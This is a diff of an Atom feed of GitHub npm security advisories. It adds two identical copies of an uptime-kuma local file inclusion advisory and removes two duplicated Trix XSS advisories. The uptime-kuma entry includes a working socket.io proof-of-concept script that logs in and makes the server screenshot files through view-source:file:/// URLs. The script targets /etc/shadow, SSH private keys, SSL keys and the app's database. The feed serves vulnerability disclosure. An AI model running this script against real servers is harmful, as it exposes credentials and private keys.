@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2024-12-20T15:01:29.762Z</updated>
+    <updated>2024-12-20T16:01:31.653Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,354 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
+        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
+        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
+        <updated>2024-12-20T15:10:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
+<ol>
+<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
+</li>
+<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
+</li>
+</ol>
+<pre><code class="language-javascript">const browser = await getBrowser();
+const context = await browser.newContext();
+const page = await context.newPage();
+
+const res = await page.goto(monitor.url, {
+    waitUntil: "networkidle",
+    timeout: monitor.interval * 1000 * 0.8,
+});
+
+let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";
+
+await page.screenshot({
+    path: path.join(Database.screenshotDir, filename),
+});
+
+await context.close();
+</code></pre>
+<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li><strong>Instructions</strong>:<ul>
+<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
+<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
+</ul>
+</li>
+</ol>
+<p>Example PoC:</p>
+<ol>
+<li>Log in to the application with valid credentials:</li>
+</ol>
+<pre><code class="language-javascript">const { io } = require("socket.io-client");
+
+// Server configuration and credentials
+const CONFIG = {
+  serverUrl: "ws://localhost:3001",
+  credentials: {
+    username: "admin",
+    password: "password1"
+  },
+  requestType: {
+    REAL_BROWSER: "real-browser",
+    HTTP: "http"
+  },
+  urlHeader: {
+    VIEW_SOURCE: "view-source:file:///",
+    FILE: "file:///"
+  }
+};
+
+// List of sensitive files on a Linux system
+const SENSITIVE_FILES = [
+  "/etc/passwd",
+  "/etc/shadow",
+  "/etc/hosts",
+  "/etc/hostname",
+  "/etc/network/interfaces", // May vary depending on the distribution
+  "/etc/ssh/ssh_config",
+  "/etc/ssh/sshd_config",
+  "~/.ssh/authorized_keys",
+  "~/.ssh/id_rsa",
+  "/etc/ssl/private/*.key",
+  "/etc/ssl/certs/*.crt",
+  "/app/data/kuma.db", // Uptime Kuma database file
+  "/app/data/config.json" // Uptime Kuma configuration file
+];
+
+// Function to send a request and wait for the response
+function sendRequest(socket, filePath, type) {
+  return new Promise((resolve, reject) =&gt; {
+    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
+    if (type == CONFIG.requestType.HTTP) {
+      fileUrl = CONFIG.urlHeader.FILE + filePath;
+    }
+    socket.emit("add", {
+      type: type,
+      name: type + " " + filePath,
+      url: fileUrl,
+      method: "GET",
+      maxretries: 0,
+      timeout: 500,
+      notificationIDList: {},
+      ignoreTls: true,
+      upsideDown: false,
+      accepted_statuscodes: ["200-299"]
+    }, (res) =&gt; {
+      console.log(`Response for file ${filePath}:`, res);
+      resolve();
+    });
+  });
+}
+
+// Main function for connecting and sending the 'add' request
+(async () =&gt; {
+  const socket = io(CONFIG.serverUrl);
+
+  // Handle connection errors
+  socket.on("connect_error", (err) =&gt; {
+    console.error("Connection failed:", err.message);
+  });
+
+  try {
+    // Connecting with credentials
+    await new Promise((resolve, reject) =&gt; {
+      socket.emit("login", {
+        username: CONFIG.credentials.username,
+        password: CONFIG.credentials.password,
+        token: ""
+      }, (res) =&gt; {
+        if (res.ok) {
+          console.log("Connection successful");
+          resolve();
+        } else {
+          console.log(res);
+          reject(new Error("Connection failed"));
+        }
+      });
+    });
+
+    // Sending requests for each file using Promise.all to ensure synchronization
+    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));
+
+    // Wait for all requests to be sent
+    await Promise.all([...realBrowserRequests]);
+
+    // Close the socket after all requests have been sent
+    socket.close();
+    console.log("Connection closed after all requests.");
+
+  } catch (error) {
+    console.error("Error:", error.message);
+    socket.close();
+  }
+})();
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
+<ul>
+<li><code>/etc/passwd</code>: Contains user account information.</li>
+<li><code>/etc/shadow</code>: Contains password hashes.</li>
+<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
+<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
+</ul>
+<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
+<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
+<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
+<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-12-20T15:10:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
+        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
+        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
+        <updated>2024-12-20T15:10:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
+<ol>
+<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
+</li>
+<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
+</li>
+</ol>
+<pre><code class="language-javascript">const browser = await getBrowser();
+const context = await browser.newContext();
+const page = await context.newPage();
+
+const res = await page.goto(monitor.url, {
+    waitUntil: "networkidle",
+    timeout: monitor.interval * 1000 * 0.8,
+});
+
+let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";
+
+await page.screenshot({
+    path: path.join(Database.screenshotDir, filename),
+});
+
+await context.close();
+</code></pre>
+<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li><strong>Instructions</strong>:<ul>
+<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
+<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
+</ul>
+</li>
+</ol>
+<p>Example PoC:</p>
+<ol>
+<li>Log in to the application with valid credentials:</li>
+</ol>
+<pre><code class="language-javascript">const { io } = require("socket.io-client");
+
+// Server configuration and credentials
+const CONFIG = {
+  serverUrl: "ws://localhost:3001",
+  credentials: {
+    username: "admin",
+    password: "password1"
+  },
+  requestType: {
+    REAL_BROWSER: "real-browser",
+    HTTP: "http"
+  },
+  urlHeader: {
+    VIEW_SOURCE: "view-source:file:///",
+    FILE: "file:///"
+  }
+};
+
+// List of sensitive files on a Linux system
+const SENSITIVE_FILES = [
+  "/etc/passwd",
+  "/etc/shadow",
+  "/etc/hosts",
+  "/etc/hostname",
+  "/etc/network/interfaces", // May vary depending on the distribution
+  "/etc/ssh/ssh_config",
+  "/etc/ssh/sshd_config",
+  "~/.ssh/authorized_keys",
+  "~/.ssh/id_rsa",
+  "/etc/ssl/private/*.key",
+  "/etc/ssl/certs/*.crt",
+  "/app/data/kuma.db", // Uptime Kuma database file
+  "/app/data/config.json" // Uptime Kuma configuration file
+];
+
+// Function to send a request and wait for the response
+function sendRequest(socket, filePath, type) {
+  return new Promise((resolve, reject) =&gt; {
+    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
+    if (type == CONFIG.requestType.HTTP) {
+      fileUrl = CONFIG.urlHeader.FILE + filePath;
+    }
+    socket.emit("add", {
+      type: type,
+      name: type + " " + filePath,
+      url: fileUrl,
+      method: "GET",
+      maxretries: 0,
+      timeout: 500,
+      notificationIDList: {},
+      ignoreTls: true,
+      upsideDown: false,
+      accepted_statuscodes: ["200-299"]
+    }, (res) =&gt; {
+      console.log(`Response for file ${filePath}:`, res);
+      resolve();
+    });
+  });
+}
+
+// Main function for connecting and sending the 'add' request
+(async () =&gt; {
+  const socket = io(CONFIG.serverUrl);
+
+  // Handle connection errors
+  socket.on("connect_error", (err) =&gt; {
+    console.error("Connection failed:", err.message);
+  });
+
+  try {
+    // Connecting with credentials
+    await new Promise((resolve, reject) =&gt; {
+      socket.emit("login", {
+        username: CONFIG.credentials.username,
+        password: CONFIG.credentials.password,
+        token: ""
+      }, (res) =&gt; {
+        if (res.ok) {
+          console.log("Connection successful");
+          resolve();
+        } else {
+          console.log(res);
+          reject(new Error("Connection failed"));
+        }
+      });
+    });
+
+    // Sending requests for each file using Promise.all to ensure synchronization
+    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));
+
+    // Wait for all requests to be sent
+    await Promise.all([...realBrowserRequests]);
+
+    // Close the socket after all requests have been sent
+    socket.close();
+    console.log("Connection closed after all requests.");
+
+  } catch (error) {
+    console.error("Error:", error.message);
+    socket.close();
+  }
+})();
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
+<ul>
+<li><code>/etc/passwd</code>: Contains user account information.</li>
+<li><code>/etc/shadow</code>: Contains password hashes.</li>
+<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
+<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
+</ul>
+<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
+<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
+<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
+<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-12-20T15:10:46.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[express] Express ressource injection]]></title>
         <id>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</id>
@@ -906,69 +1254,5 @@ WEBSOCKETS_REST_AUTH=public
         </author>
         <category label="severity" term="HIGH"/>
         <published>2024-12-09T20:40:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[trix] Trix editor subject to XSS vulnerabilities on copy & paste]]></title>
-        <id>https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</id>
-        <link href="https://github.com/advisories/GHSA-6vx4-v2jw-qwqh"/>
-        <updated>2024-12-09T21:53:55.000Z</updated>
-        <content type="html"><![CDATA[<p>The Trix editor, in versions prior to 2.1.9 and 1.3.3, is vulnerable to XSS + mutation XSS attacks when pasting malicious code.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could trick a user to copy and paste malicious code that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
-<h3 id="patches">Patches</h3>
-<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.9 or later, which uses <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> to sanitize the pasted content. </p>
-<p>If using Trix 1.x, upgrade to version 1.3.3 or later.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
-<h3 id="references">References</h3>
-<p>The XSS vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/hiumee?type=user">hiumee</a>.
-The mutation XSS vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/sudi?type=user">sudi</a>.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-6vx4-v2jw-qwqh">https://github.com/basecamp/trix/security/advisories/GHSA-6vx4-v2jw-qwqh</a></li>
-<li><a href="https://github.com/basecamp/trix/commit/272c7e27e722608732a67108ad3fe7870e233ac8">https://github.com/basecamp/trix/commit/272c7e27e722608732a67108ad3fe7870e233ac8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53847">https://nvd.nist.gov/vuln/detail/CVE-2024-53847</a></li>
-<li><a href="https://github.com/advisories/GHSA-6vx4-v2jw-qwqh">https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2024-12-09T20:38:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[trix] Trix editor subject to XSS vulnerabilities on copy & paste]]></title>
-        <id>https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</id>
-        <link href="https://github.com/advisories/GHSA-6vx4-v2jw-qwqh"/>
-        <updated>2024-12-09T21:53:55.000Z</updated>
-        <content type="html"><![CDATA[<p>The Trix editor, in versions prior to 2.1.9 and 1.3.3, is vulnerable to XSS + mutation XSS attacks when pasting malicious code.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker could trick a user to copy and paste malicious code that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>
-<h3 id="patches">Patches</h3>
-<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.9 or later, which uses <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> to sanitize the pasted content. </p>
-<p>If using Trix 1.x, upgrade to version 1.3.3 or later.</p>
-<h3 id="mitigations">Mitigations</h3>
-<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>
-<h3 id="references">References</h3>
-<p>The XSS vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/hiumee?type=user">hiumee</a>.
-The mutation XSS vulnerability was reported by HackerOne researcher <a href="https://hackerone.com/sudi?type=user">sudi</a>.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/basecamp/trix/security/advisories/GHSA-6vx4-v2jw-qwqh">https://github.com/basecamp/trix/security/advisories/GHSA-6vx4-v2jw-qwqh</a></li>
-<li><a href="https://github.com/basecamp/trix/commit/272c7e27e722608732a67108ad3fe7870e233ac8">https://github.com/basecamp/trix/commit/272c7e27e722608732a67108ad3fe7870e233ac8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53847">https://nvd.nist.gov/vuln/detail/CVE-2024-53847</a></li>
-<li><a href="https://github.com/advisories/GHSA-6vx4-v2jw-qwqh">https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6vx4-v2jw-qwqh</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2024-12-09T20:38:42.000Z</published>
     </entry>
 </feed>
